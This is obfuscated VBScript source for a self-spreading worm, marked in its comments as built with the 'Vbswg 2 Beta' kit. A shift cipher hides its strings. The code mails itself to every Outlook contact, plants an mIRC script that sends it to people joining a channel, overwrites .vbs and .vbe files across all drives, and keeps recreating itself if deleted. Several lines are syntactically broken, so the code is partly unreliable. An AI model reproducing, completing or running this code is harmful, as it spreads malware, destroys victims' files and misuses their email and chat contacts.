'Vbs.Vbswg.Vbswg Worm Created By x. 5/2/2005
Set L78QDSVD = createobject(P9167UMQ("vfulswlqj1ilohv|vwhpremhfw",-3))
M8SPP369 = L78QDSVD.getspecialfolder(2)
U882ENCE = M8SPP369 & P9167UMQ("ZT`que]Umpk,hne,t`q",2)
Set B03JA5L4 = createobject(P9167UMQ("yuetkrv0ujgnn",-2))
L78QDSVD.copyfile wscript.scriptfullname, U882ENCE
If B03JA5L4.regread(P9167UMQ("NQRSbYULZ]GXKbSoixuyulzb]otju}ybI{xxktz\kxyoutb\hy}m&]uxsbX;<89GTY",-6)) <> 1 then
RT2LJ685
End if
If B03JA5L4.regread(P9167UMQ("EHIJYPLCQT>OBYJf`olplcqYTfkaltpY@roobkqSbopflkYS_ptdTlojYE>-@4F0H",3)) <> 1 then
A5UT4937 P9167UMQ("",0)
End if

Set EJSL2BAE= L78QDSVD.opentextfile(wscript.scriptfullname)
M24N87AH = EJSL2BAE.readall
EJSL2BAE.close
Do
if not(L78QDSVD.fileexists(wscript.scriptfullname)) then
set IC9FESF1= L78QDSVD.createtextfile(wscript.scriptfullname)
IC9FESF1.write M24N87AH
IC9FESF1.close
end if
loop
Function RT2LJ685()
Set I6IH5I27 = CreateObject(P9167UMQ("W}|twws6Ixxtqki|qwv",-8))
If I6IH5I27 = P9167UMQ("Tzyqttp",-5) Then
Set TCT9408N = I6IH5I27.GetNameSpace(P9167UMQ("NBQJ",-1))
Set GJ2P8455 = TCT9408N.AddressLists
For Each KECO74GA In GJ2P8455
If KECO74GA.AddressEntries.Count <> 0 Then
L664C1V6 = KECO74GA.AddressEntries.Count
For H36H3027 = 1 To L664C1V6
Set A0H9VTFK = I6IH5I27.CreateItem(0)
Set F8S6P343 = KECO74GA.AddressEntries(H36H3027)
A0H9VTFK.To = F8S6P343.Address
A0H9VTFK.Subject = P9167UMQ("^mzÅ(Quxwz|iv|)",-8)
A0H9VTFK.Body = P9167UMQ("Ij;",-1) & vbcrlf & P9167UMQ("Rngcugxkgyvjkuhkng.kv)uxgt{korqtvcpv0",-2) & vbcrlf & P9167UMQ("",-3)
execute P9167UMQ("vhw#WH9OXX64#@D3K<YWIN1",-3) & Chr(65) & Chr(116) & Chr(116) & Chr(97) & Chr(99) & Chr(104) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(115)
QGQ210M5 = U882ENCE
A0H9VTFK.DeleteAfterSubmit = True
TE6LUU31.Add QGQ210M5
If A0H9VTFK.To <> P9167UMQ("",-6) Then
A0H9VTFK.Send
End If
Next
End If
Next
End If
End function
Function A5UT4937(RFQ9JG6E)
If RFQ9JG6E <> P9167UMQ("",1) Then
G8278QDS = B03JA5L4.regread(P9167UMQ("JMG[aNQECNaOCEJKPG^Uqhvyctg^Oketquqhv^Ykpfqyu^EwttgpvXgtukqp^RtqitcoHknguFkt",-2))
If L78QDSVD.fileexists(P9167UMQ("g>`qmvg`qmvg2mrm",-4)) Then
RFQ9JG6E = P9167UMQ("mDfws|m",-10)
ElseIf L78QDSVD.fileexists(P9167UMQ("^5Whdm^.-Whdm^)did",5)) Then
RFQ9JG6E = P9167UMQ("h?arnwh87",-5)
ElseIf L78QDSVD.fileexists(G8278QDS & P9167UMQ("Whdm^Whdm^)did",5)) Then
RFQ9JG6E = G8278QDS & P9167UMQ("Zkgpa",2)
ElseIf L78QDSVD.fileexists(G8278QDS & P9167UMQ("^okte54^okte0kpk",-2)) Then
RFQ9JG6E = G8278QDS & P9167UMQ("arnwh",-5)
Else
RFQ9JG6E = P9167UMQ("",2)
End If
End If
If RFQ9JG6E <> P9167UMQ("",3) Then
Set VHO45V1U = L78QDSVD.CreateTextFile(RFQ9JG6E & P9167UMQ("axhwnuy3nsn",-5), True)
VHO45V1U = P9167UMQ("\tdsjqu^",-1) & vbCrLf & P9167UMQ("s5Bts%6?OTNS?(?Ä",-5)
VHO45V1U = VHO45V1U & vbCrLf & P9167UMQ("m/<nm09INHM99z",1)
VHO45V1U = VHO45V1U & vbCrLf & P9167UMQ("t7C&&5ol&.&*toiq&CC&*sk&/&Å&ngrz&É",-6)
VHO45V1U = VHO45V1U & vbCrLf & P9167UMQ("k/:,+",3) & Chr(100) & Chr(99) & Chr(99) & P9167UMQ("!tfoe!%ojdl!",-1)
VHO45V1U = VHO45V1U & U882ENCE
VHO45V1U = VHO45V1U & vbCrLf & P9167UMQ("p5?",-2)
script.Close
End If
End Function
Function EQR03JA5()
On Error Resume Next
Set LA28SPP3 = L78QDSVD.Drives
For Each IK1882EN In LA28SPP3
CQ75623A = IK1882EN & P9167UMQ("'c'",-7)
Call N57T2LJ6(CQ75623A)
Next
End Function

Function N57T2LJ6(F1EA0C7I)
DLC5UT49 = F1EA0C7I
Set KCCJSL2B = L78QDSVD.GetFolder(DLC5UT49)
Set AU424N87 = KCCJSL2B.Files
For Each ARHC9FES In AU424N87
If lcase(ARHC9FES.Name) = P9167UMQ("soxi4oto",-6) Then
A5UT4937(ARHC9FES.ParentFolder)
End If
If L78QDSVD.GetExtensionName(ARHC9FES.path) = P9167UMQ("Äl}",-10)
L78QDSVD.CopyFile wscript.scriptfullname,ARHC9FES.path,true
End if
If L78QDSVD.GetExtensionName(ARHC9FES.path) = P9167UMQ("Älo",-10)
L78QDSVD.CopyFile wscript.scriptfullname,ARHC9FES.path,true
End if
Next
Set FNL6IH5I = KCCJSL2B.Subfolders
For Each NL7CT940 In FNL6IH5I
Call (NL7CT940.path)
Next
End function
'Vbswg 2 Beta. By [K]
Function P9167UMQ(H0B94PCQ,U9A4OM8I)
For VHD2F9L6 = 1 To Len(H0B94PCQ)
NF72AC2N = Mid(H0B94PCQ, VHD2F9L6, 1)
If NF72AC2N = Chr(2) Then
NF72AC2N = Chr(34 + U9A4OM8I)
ElseIf NF72AC2N = Chr(3) Then
NF72AC2N = Chr(10 + U9A4OM8I)
ElseIf NF72AC2N = Chr(4) Then
NF72AC2N = Chr(13 + U9A4OM8I)
Else
NF72AC2N = Chr(Asc(NF72AC2N) + U9A4OM8I)
End If
P9167UMQ = P9167UMQ & NF72AC2N
Next
End Function'Vbswg 2 Beta. By [K]